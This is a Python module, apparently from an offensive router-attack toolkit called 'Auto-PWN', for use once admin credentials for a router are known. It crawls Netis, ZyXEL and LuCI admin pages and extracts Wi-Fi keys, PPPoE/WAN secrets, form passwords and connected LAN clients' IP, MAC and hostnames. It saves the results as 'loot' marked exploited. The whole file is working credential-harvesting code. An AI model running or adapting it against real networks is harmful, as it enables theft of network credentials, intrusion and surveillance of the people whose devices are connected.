"""
Deep harvest on an already-authenticated router web session.

Use when the operator provides http://user:pass@ip/ — crawls admin pages,
extracts device info, Wi-Fi, DHCP/ARP clients, WAN/PPPoE secrets, and CVE hints.
"""

from __future__ import annotations

import json
import os
import re
from html import unescape
from typing import Any
from urllib.parse import urljoin, urlparse

import requests

from core.target_auth import auth_from_hints, parse_target_auth
from engines.credential_hunter import _netis_login_url
from engines.device_cve_checker import assess_device, print_cve_report
from engines.fingerprinter import Fingerprinter
from engines.loot_report import LootEntry, LootReport
from engines.utils import extract_credentials, extract_ip, log, save_success

# --- Page lists per vendor ---
NETIS_PATHS: tuple[str, ...] = (
    "index.htm",
    "status.htm",
    "status_inter.htm",
    "status_stat.htm",
    "wan.htm",
    "adsl.htm",
    "adsl_status.htm",
    "wireless.htm",
    "wl_basic.htm",
    "wl_security.htm",
    "wl_ad.htm",
    "wl_filter.htm",
    "wlan.htm",
    "lan.htm",
    "dhcp.htm",
    "dhcp_clients.htm",
    "arp.htm",
    "route.htm",
    "nat.htm",
    "dmz.htm",
    "filter.htm",
    "user.htm",
    "passwd.htm",
    "password.htm",
    "syslog.htm",
    "time.htm",
    "qos.htm",
    "maintenance.htm",
    "backup.htm",
    "stat.htm",
    "statistics.htm",
    "deviceinfo.htm",
)

ZYXEL_PATHS: tuple[str, ...] = (
    "Forms/Status_1",
    "Forms/Status_WAN_1",
    "Forms/Status_LAN_1",
    "Forms/General_1",
    "Forms/WLAN_General_1",
    "Forms/WLAN_Security_1",
    "Forms/DHCPClientsTable_1",
    "Forms/ARPTable_1",
    "Forms/Route_1",
    "Forms/NAT_1",
    "Forms/Firewall_1",
    "Forms/Maintenance_1",
    "Forms/Backup_1",
    "Forms/UserAccount_1",
    "Forms/ADSL_Status_1",
    "Forms/Device_Info_1",
)

GENERIC_PATHS: tuple[str, ...] = (
    "status.htm",
    "wan.htm",
    "wireless.htm",
    "wlan.htm",
    "dhcp.htm",
    "dhcp_clients.htm",
    "lan.htm",
    "arp.htm",
    "deviceinfo.htm",
    "maintenance.htm",
    "cgi-bin/luci/admin/status/overview",
    "cgi-bin/luci/admin/network/dhcp",
    "cgi-bin/luci/admin/network/wireless",
)

MENU_KEYWORDS = re.compile(
    r"(device_info|deviceinfo|status|statistics|wireless|wlan|dhcp|lan|wan|"
    r"firewall|maintenance|backup|adsl|ppp|user|password|client|arp|nat|dmz|"
    r"forms/|goform)",
    re.I,
)
IP_RE = re.compile(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b")
MAC_RE = re.compile(r"\b([0-9a-f]{2}(?::[0-9a-f]{2}){5})\b", re.I)
PRIVATE_IP_RE = re.compile(
    r"^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)"
)
JUNK_VALUES = frozenset(
    {"type", "text", "password", "button", "submit", "on", "off", "enable", "disable", ""}
)
SSID_INPUT = re.compile(r"ssid|wlan_ssid|wl_ssid|wifi_ssid|network_name", re.I)
KEY_INPUT = re.compile(r"psk|wpa|wep|passphrase|wifi_key|wlan_key|security_key|wpapsk", re.I)
PASS_INPUT = re.compile(
    r"pass|pwd|psk|pppoe|wpa|wep|key|secret|pin", re.I
)


def _session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers["User-Agent"] = "Mozilla/5.0 Auto-PWN-RouterHarvest/1.0"
    return s


def _load_hints(target_dir: str) -> dict:
    path = os.path.join(target_dir, "target_hints.json")
    if not os.path.isfile(path):
        return {}
    try:
        with open(path, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except (OSError, json.JSONDecodeError):
        return {}


def resolve_auth(
    raw_target: str,
    target_dir: str,
    username: str | None = None,
    password: str | None = None,
) -> dict[str, Any]:
    auth = parse_target_auth(raw_target)
    if auth:
        return auth
    hints = _load_hints(target_dir)
    hint_pair = auth_from_hints(hints)
    host = hints.get("host") or extract_ip(raw_target) or raw_target.strip()
    port = int(hints.get("port") or 80)
    scheme = hints.get("scheme") or "http"
    user = username
    pwd = password or ""
    if hint_pair:
        user, pwd = hint_pair
    if not user:
        u, p = extract_credentials(raw_target)
        if u:
            user, pwd = u, p or ""
    if not user:
        raise ValueError(
            "No credentials — use http://user:pass@IP/ in the target bar or pass username/password."
        )
    if port in (80, 443):
        netloc = host
    else:
        netloc = f"{host}:{port}"
    base = f"{scheme}://{netloc}"
    return {
        "username": user,
        "password": pwd,
        "scheme": scheme,
        "host": host,
        "port": port,
        "path": "/",
        "base_url": base,
        "authenticated_url": f"{scheme}://{user}:{pwd}@{netloc}/",
    }


def establish_session(conn: dict[str, Any]) -> tuple[requests.Session, str]:
    base = conn["base_url"]
    user = conn["username"]
    password = conn["password"]
    session = _session()
    session.headers["Referer"] = f"{base}/index.htm"

    if _netis_login_url(base):
        session.post(
            f"{base}/login.cgi",
            data={
                "username": user,
                "password": password,
                "submit.htm?login.htm": "Send",
            },
            timeout=12,
        )
        probe = session.get(f"{base}/index.htm", timeout=10)
        body = probe.text.lower()
        if probe.status_code == 200 and (
            "login.htm" not in body[:2000] or "logout" in body or "wireless" in body
        ):
            if "error" not in body[:1500] and "alert" not in body[:1500]:
                return session, "Netis form (login.cgi)"

    session.auth = (user, password)
    try:
        r = session.get(base + "/", timeout=10)
        text = r.text.lower()
        if r.status_code == 200 and not ('name="password"' in text[:3000] and "logout" not in text):
            if any(x in text for x in ("logout", "device_info", "wireless", "dhcp", "status", "wan")):
                return session, "HTTP Basic/Digest"
    except requests.RequestException:
        pass

    session.auth = None
    r = session.get(base + "/", auth=(user, password), timeout=10)
    text = r.text.lower()
    if r.status_code == 200 and any(
        x in text for x in ("logout", "sign out", "device_info", "wireless", "dhcp", "statistics")
    ):
        return session, "HTTP auth (explicit)"

    raise RuntimeError(
        f"Could not verify login for {user}@{conn['host']} — check URL/credentials."
    )


def _vendor_paths(device_type: str, server: str, html_sample: str) -> list[str]:
    low = (html_sample or "").lower()
    if device_type == "NETIS" or "netis" in low or "login.cgi" in low:
        return list(NETIS_PATHS)
    if "virtual web" in (server or "").lower() or "zyxel" in low:
        return list(ZYXEL_PATHS)
    return list(GENERIC_PATHS) + list(NETIS_PATHS)


def _discover_embedded_urls(base: str, html: str) -> list[str]:
    found: list[str] = []
    patterns = (
        r"""<frame[^>]+src=["']([^"']+)["']""",
        r"""<iframe[^>]+src=["']([^"']+)["']""",
        r"""href\s*=\s*['"]([^'"]+\.(?:htm|html|asp|cgi)[^'"]*)['"]""",
        r"""['"]([a-zA-Z0-9_./-]+\.(?:htm|html|asp|cgi)(?:\?[^'"]*)?)['"]""",
        r"""(?:location|href)\s*=\s*['"]([^'"]+\.htm[^'"]*)['"]""",
    )
    base_p = urlparse(base)
    for pat in patterns:
        for m in re.finditer(pat, html, re.I):
            href = unescape(m.group(1).strip())
            if not href or href.startswith(("#", "javascript:", "mailto:")):
                continue
            full = urljoin(base + "/", href)
            parsed = urlparse(full)
            if parsed.hostname and parsed.hostname != base_p.hostname:
                continue
            if full not in found:
                found.append(full)
    return found


def _discover_hrefs(base: str, html: str) -> list[str]:
    found = _discover_embedded_urls(base, html)
    for m in re.finditer(r"""href\s*=\s*['"]([^'"]+)['"]""", html, re.I):
        href = unescape(m.group(1).strip())
        if not href or href.startswith(("#", "javascript:", "mailto:")):
            continue
        full = urljoin(base + "/", href)
        parsed = urlparse(full)
        base_p = urlparse(base)
        if parsed.hostname and parsed.hostname != base_p.hostname:
            continue
        path = parsed.path or "/"
        if not MENU_KEYWORDS.search(path) and not path.endswith(
            (".htm", ".html", ".asp", ".cgi", ".php")
        ):
            continue
        if full not in found:
            found.append(full)
    return found[:60]


def _parse_input_fields(html: str) -> list[dict[str, str]]:
    rows: list[dict[str, str]] = []
    for m in re.finditer(r"<input([^>]+)>", html, re.I):
        tag = m.group(1)
        name_m = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
        if not name_m:
            continue
        name = name_m.group(1)
        val_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
        typ_m = re.search(r'type=["\']([^"\']+)["\']', tag, re.I)
        val = unescape(val_m.group(1)).strip() if val_m else ""
        typ = (typ_m.group(1).lower() if typ_m else "text")
        rows.append({"name": name, "value": val, "type": typ})
    for m in re.finditer(
        r"<textarea[^>]+name=['\"]([^'\"]+)['\"][^>]*>([^<]*)</textarea>",
        html,
        re.I | re.S,
    ):
        rows.append({"name": m.group(1), "value": unescape(m.group(2)).strip(), "type": "textarea"})
    return rows


def _extract_wireless(html: str) -> tuple[str, str]:
    ssid, key = "", ""
    for field in _parse_input_fields(html):
        name, val, typ = field["name"], field["value"], field["type"]
        if not val or val.lower() in JUNK_VALUES or len(val) < 2:
            continue
        if SSID_INPUT.search(name):
            if len(val) >= 2 and not val.startswith("type"):
                ssid = ssid or val
        if KEY_INPUT.search(name) or (typ == "password" and "wlan" in name.lower()):
            if len(val) >= 4:
                key = key or val
    for m in re.finditer(r'(?:ssid|SSID)\s*[=:]\s*["\']([^"\']{2,32})["\']', html):
        ssid = ssid or m.group(1)
    for m in re.finditer(
        r'(?:wpapsk|wpa_key|psk|passphrase)\s*[=:]\s*["\']([^"\']{4,64})["\']',
        html,
        re.I,
    ):
        key = key or m.group(1)
    return ssid, key


def _extract_secrets_from_inputs(html: str, page: str) -> list[dict[str, str]]:
    secrets: list[dict[str, str]] = []
    for field in _parse_input_fields(html):
        name, val, typ = field["name"], field["value"], field["type"]
        if not val or val.lower() in JUNK_VALUES:
            continue
        if typ == "password" or PASS_INPUT.search(name):
            if len(val) >= 2 and val.lower() not in JUNK_VALUES:
                secrets.append({"page": page, "field": name, "value": val, "type": typ})
    return secrets


def _extract_key_values(html: str) -> dict[str, str]:
    fields: dict[str, str] = {}
    kv_re = re.compile(
        r"(?:<td[^>]*>\s*)?([A-Za-z][\w\s./\-]{2,50})(?:</td>)?\s*"
        r"(?:<td[^>]*>|:)\s*([^<\n\r]{1,200})",
        re.I,
    )
    for m in kv_re.finditer(html):
        key = re.sub(r"\s+", " ", m.group(1)).strip()
        val = re.sub(r"\s+", " ", unescape(m.group(2))).strip()
        if len(key) < 3 or len(val) < 1 or val.lower() in JUNK_VALUES:
            continue
        if key.lower() in ("click", "button", "submit", "type"):
            continue
        fields[key] = val[:300]
    for field in _parse_input_fields(html):
        if field["value"] and field["value"].lower() not in JUNK_VALUES:
            fields.setdefault(field["name"], field["value"][:300])
    return fields


def _is_router_ip(ip: str, router_public: str, gateway: str | None) -> bool:
    if ip == router_public:
        return True
    if gateway and ip == gateway:
        return True
    if ip.startswith(("127.", "0.", "255.")):
        return True
    if ip.endswith(".255"):
        return True
    return False


def _extract_clients(
    html: str,
    *,
    router_public: str,
    gateway: str | None = None,
    page: str = "",
) -> list[dict[str, str]]:
    clients: list[dict[str, str]] = []
    seen_mac: set[str] = set()
    seen_ip: set[str] = set()

    for row in re.findall(r"<tr[^>]*>(.*?)</tr>", html, re.I | re.S):
        ips = IP_RE.findall(row)
        macs = [m.lower() for m in MAC_RE.findall(row)]
        if not ips and not macs:
            continue
        priv_ips = [ip for ip in ips if PRIVATE_IP_RE.match(ip)]
        if macs:
            for mac in macs:
                if mac in seen_mac:
                    continue
                ip = priv_ips[0] if priv_ips else ""
                if ip and _is_router_ip(ip, router_public, gateway):
                    if len(priv_ips) > 1:
                        ip = next((x for x in priv_ips if not _is_router_ip(x, router_public, gateway)), "")
                    else:
                        ip = ""
                if ip and ip in seen_ip:
                    continue
                entry: dict[str, str] = {"mac": mac, "source_page": page}
                if ip:
                    entry["ip"] = ip
                    seen_ip.add(ip)
                seen_mac.add(mac)
                tds = re.findall(r"<td[^>]*>([^<]+)</td>", row, re.I)
                for td in tds:
                    t = td.strip()
                    if t and not IP_RE.match(t) and not MAC_RE.match(t) and len(t) > 1:
                        entry.setdefault("hostname", t)
                        break
                clients.append(entry)
        elif priv_ips:
            for ip in priv_ips:
                if _is_router_ip(ip, router_public, gateway) or ip in seen_ip:
                    continue
                seen_ip.add(ip)
                clients.append({"ip": ip, "source_page": page})

    # Standalone MAC lines (some firmware)
    if "arp" in page.lower() or "dhcp" in page.lower() or "client" in page.lower():
        for m in re.finditer(
            r"([0-9a-f]{2}(?::[0-9a-f]{2}){5})\s*(?:[^<\d]{0,40})?\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})",
            html,
            re.I,
        ):
            mac, ip = m.group(1).lower(), m.group(2)
            if mac in seen_mac or _is_router_ip(ip, router_public, gateway):
                continue
            if not PRIVATE_IP_RE.match(ip):
                continue
            seen_mac.add(mac)
            seen_ip.add(ip)
            clients.append({"ip": ip, "mac": mac, "source_page": page})

    return clients


def _merge_clients(existing: list[dict[str, str]], new: list[dict[str, str]]) -> None:
    by_mac = {c.get("mac", "").lower(): c for c in existing if c.get("mac")}
    by_ip = {c.get("ip", ""): c for c in existing if c.get("ip")}
    for c in new:
        mac = c.get("mac", "").lower()
        ip = c.get("ip", "")
        if mac and mac in by_mac:
            by_mac[mac].update({k: v for k, v in c.items() if v})
            continue
        if ip and ip in by_ip:
            by_ip[ip].update({k: v for k, v in c.items() if v})
            continue
        existing.append(c)
        if mac:
            by_mac[mac] = c
        if ip:
            by_ip[ip] = c


def _guess_gateway(html_pages: dict[str, str], default: str = "192.168.1.1") -> str:
    for text in html_pages.values():
        m = re.search(r"(?:gateway|default gateway|lan ip)[^0-9]*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", text, re.I)
        if m:
            return m.group(1)
    return default


def _fetch_page(session: requests.Session, url: str) -> tuple[str, int]:
    try:
        r = session.get(url, timeout=14, allow_redirects=True)
        return r.text, r.status_code
    except requests.RequestException as exc:
        return f"<!-- error: {exc} -->", 0


def _safe_page_path(pages_dir: str, url: str) -> str:
    path = urlparse(url).path.strip("/").replace("/", "_") or "root"
    safe = re.sub(r"[^\w.\-]+", "_", path)[:100]
    return os.path.join(pages_dir, f"{safe}.html")


def run_router_harvest(
    target_dir: str,
    raw_target: str = "",
    *,
    username: str | None = None,
    password: str | None = None,
    max_pages: int = 90,
) -> dict[str, Any]:
    os.makedirs(target_dir, exist_ok=True)
    conn = resolve_auth(raw_target, target_dir, username, password)
    ip = conn["host"]
    log(f"Router harvest: {conn['username']}@{ip} (workspace {target_dir})", "SUCCESS")

    session, auth_method = establish_session(conn)
    base = conn["base_url"]

    fp = Fingerprinter(conn.get("authenticated_url") or base)
    fp_info = fp.identify_details()
    device_type = fp_info.get("device_type", "UNKNOWN")
    model = fp_info.get("model", "")
    server = fp_info.get("server", "")

    index_html, _ = _fetch_page(session, urljoin(base + "/", "index.htm"))
    vendor_paths = _vendor_paths(device_type, server, index_html)

    pages_dir = os.path.join(target_dir, "router_harvest_pages")
    os.makedirs(pages_dir, exist_ok=True)

    to_visit: list[str] = []
    for rel in vendor_paths:
        to_visit.append(urljoin(base + "/", rel))
    for u in _discover_embedded_urls(base, index_html):
        if u not in to_visit:
            to_visit.append(u)

    visited: set[str] = set()
    page_store: dict[str, dict[str, Any]] = {}
    raw_html_by_path: dict[str, str] = {}
    all_fields: dict[str, str] = {}
    all_clients: list[dict[str, str]] = []
    all_secrets: list[dict[str, str]] = []
    wireless_ssid, wireless_key = "", ""
    gateway: str | None = None

    while to_visit and len(visited) < max_pages:
        url = to_visit.pop(0)
        norm = url.split("?", 1)[0]
        if norm in visited:
            continue
        visited.add(norm)
        html, status = _fetch_page(session, url)
        if status not in (200, 206) or len(html) < 40:
            continue

        page_path = _safe_page_path(pages_dir, norm)
        with open(page_path, "w", encoding="utf-8", errors="ignore") as fh:
            fh.write(html)

        rel = urlparse(norm).path or "/"
        raw_html_by_path[rel] = html

        fields = _extract_key_values(html)
        for k, v in fields.items():
            all_fields.setdefault(k, v)

        if not gateway:
            gateway = _guess_gateway({rel: html})

        clients = _extract_clients(
            html,
            router_public=ip,
            gateway=gateway,
            page=rel,
        )
        _merge_clients(all_clients, clients)

        ssid, key = _extract_wireless(html)
        if ssid and ssid.lower() not in JUNK_VALUES:
            wireless_ssid = wireless_ssid or ssid
        if key and key.lower() not in JUNK_VALUES and key != "type":
            wireless_key = wireless_key or key

        for sec in _extract_secrets_from_inputs(html, rel):
            if not any(s.get("field") == sec["field"] and s.get("value") == sec["value"] for s in all_secrets):
                all_secrets.append(sec)

        page_store[norm] = {
            "status": status,
            "file": page_path,
            "fields": fields,
            "clients": clients,
        }
        log(
            f"Harvested: {rel} ({len(fields)} fields, {len(clients)} clients, "
            f"{len(all_secrets)} secrets total)",
            "INFO",
        )

        for link in _discover_hrefs(base, html):
            link_norm = link.split("?", 1)[0]
            if link_norm not in visited and link not in to_visit:
                to_visit.append(link)

    if not gateway:
        gateway = _guess_gateway(raw_html_by_path)

    # PPPoE / WAN from fields
    pppoe: dict[str, str] = {}
    for key, val in all_fields.items():
        kl = key.lower()
        if "ppp" in kl or "adsl" in kl or "wan" in kl:
            if PASS_INPUT.search(kl) or "user" in kl:
                pppoe[key] = val

    admin_passwords = [
        {"field": s["field"], "value": s["value"], "page": s["page"]}
        for s in all_secrets
        if "admin" in s["field"].lower() or s["type"] == "password"
    ]

    intel = assess_device(
        ip,
        conn["port"],
        device_type,
        model=model,
        server=server,
        auth=(conn["username"], conn["password"]),
    )

    credentials = [
        {
            "service": "router_web",
            "username": conn["username"],
            "password": conn["password"],
            "auth_method": auth_method,
        }
    ]
    if wireless_ssid or wireless_key:
        credentials.append(
            {"service": "wireless", "ssid": wireless_ssid, "password": wireless_key}
        )
    for s in all_secrets:
        if s["field"].lower() in ("password", "passwd", "pwd") and s["value"]:
            credentials.append(
                {"service": f"form:{s['page']}", "field": s["field"], "password": s["value"]}
            )

    summary: dict[str, Any] = {
        "host": ip,
        "port": conn["port"],
        "base_url": base,
        "authenticated_url": conn.get("authenticated_url"),
        "username": conn["username"],
        "password": conn["password"],
        "auth_method": auth_method,
        "device_type": device_type,
        "model": model,
        "server": server,
        "lan_gateway": gateway,
        "pages_fetched": len(page_store),
        "device_fields": all_fields,
        "connected_clients": all_clients,
        "wireless": {"ssid": wireless_ssid, "key": wireless_key},
        "secrets_in_html": [f"{s['page']}:{s['field']}={s['value']}" for s in all_secrets],
        "form_secrets": all_secrets,
        "admin_passwords": admin_passwords,
        "pppoe_wan": pppoe,
        "credentials": credentials,
        "cve_assessments": [
            {
                "cve_id": a.cve_id,
                "title": a.title,
                "severity": a.severity,
                "status": a.status,
                "reason": a.reason,
            }
            for a in intel.assessments
        ],
        "nuclei_templates": list(intel.nuclei_templates)[:30],
        "nuclei_tags": list(intel.nuclei_tags)[:20],
        "pages": {
            k: {"file": v["file"], "field_count": len(v["fields"]), "clients": len(v["clients"])}
            for k, v in page_store.items()
        },
        "harvest_note": (
            f"Fetched {len(page_store)} admin pages. "
            f"LAN clients with MAC: {sum(1 for c in all_clients if c.get('mac'))}. "
            "If clients are empty, open router_harvest_pages/arp.htm and dhcp_clients.htm manually."
        ),
    }

    json_path = os.path.join(target_dir, "ROUTER_HARVEST.json")
    with open(json_path, "w", encoding="utf-8") as fh:
        json.dump(summary, fh, indent=2, ensure_ascii=False)

    clients_path = os.path.join(target_dir, "ROUTER_LAN_CLIENTS.json")
    with open(clients_path, "w", encoding="utf-8") as fh:
        json.dump({"gateway": gateway, "clients": all_clients}, fh, indent=2, ensure_ascii=False)

    txt_lines = [
        "=" * 60,
        f"ROUTER HARVEST — {ip}",
        f"Login: {conn['username']}:{conn['password']} ({auth_method})",
        f"Device: {device_type} | {model} | Server: {server}",
        f"LAN gateway: {gateway or '—'}",
        f"Pages saved: {len(page_store)} → {pages_dir}",
        "=" * 60,
        "",
        "— CVE / risk —",
    ]
    for a in intel.assessments:
        txt_lines.append(f"  {a.cve_id} [{a.severity}] {a.status}: {a.title}")
    txt_lines.extend(
        [
            "",
            "— Wireless (Wi‑Fi) —",
            f"  SSID : {wireless_ssid or '(not in HTML — check wl_security.htm)'}",
            f"  Key  : {wireless_key or '(not in HTML — often hidden for guest account)'}",
            "",
            "— Router / WAN / PPPoE (from forms) —",
        ]
    )
    if pppoe:
        for k, v in pppoe.items():
            txt_lines.append(f"  {k}: {v}")
    else:
        txt_lines.append("  (none parsed — see wan.htm / adsl.htm in router_harvest_pages/)")
    txt_lines.extend(["", "— Passwords in admin forms —"])
    if all_secrets:
        for s in all_secrets[:25]:
            txt_lines.append(f"  [{s['page']}] {s['field']} = {s['value']}")
    else:
        txt_lines.append("  (none — guest may not see passwords; try admin account)")
    txt_lines.extend(["", "— LAN / DHCP / ARP clients —"])
    if all_clients:
        for c in all_clients:
            txt_lines.append(
                f"  ip={c.get('ip', '—'):<16} mac={c.get('mac', '—'):<18} "
                f"host={c.get('hostname', '—'):<20} src={c.get('source_page', '')}"
            )
    else:
        txt_lines.append(
            "  (none with MAC — open arp.htm / dhcp_clients.htm in saved pages; "
            "or run Nmap on LAN after harvest)"
        )
    txt_lines.extend(["", "— Device info (fields) —"])
    for k, v in list(all_fields.items())[:50]:
        txt_lines.append(f"  {k}: {v}")

    txt_path = os.path.join(target_dir, "ROUTER_HARVEST.txt")
    with open(txt_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(txt_lines))

    with open(os.path.join(target_dir, "ROUTER_ACCESS.txt"), "w", encoding="utf-8") as fh:
        fh.write(
            f"{conn['username']}:{conn['password']}\n"
            f"url={conn.get('authenticated_url') or base}\n"
            f"method={auth_method}\n"
            f"gateway={gateway or ''}\n"
        )

    loot = LootReport(ip)
    loot.add(
        LootEntry(
            ip=ip,
            port=conn["port"],
            device_type=device_type,
            model=model,
            username=conn["username"],
            password=conn["password"],
            auth_method=auth_method,
            wireless_ssid=wireless_ssid,
            wireless_key=wireless_key,
        )
    )
    from dataclasses import asdict

    with open(os.path.join(target_dir, "ENGINE_LOOT.json"), "w", encoding="utf-8") as fh:
        json.dump(
            {
                "summary": {"exploited": True, "device_type": device_type},
                "loot": {
                    "entries": [asdict(e) for e in loot.entries],
                    "files": loot.files,
                    "notes": loot.notes + [summary.get("harvest_note", "")],
                },
            },
            fh,
            indent=2,
            ensure_ascii=False,
        )
    loot.print_final()
    save_success(ip, f"Router web ({conn['port']})", f"{conn['username']}:{conn['password']}")
    log(f"Router harvest saved: {txt_path}", "SUCCESS")
    print_cve_report(intel)

    from core.workflow_recommendations import emit_post_tool_recommendations

    emit_post_tool_recommendations(
        target_dir,
        ip,
        finished_tool="router-harvest",
        exploited=True,
        job_kind="custom",
    )
    return summary
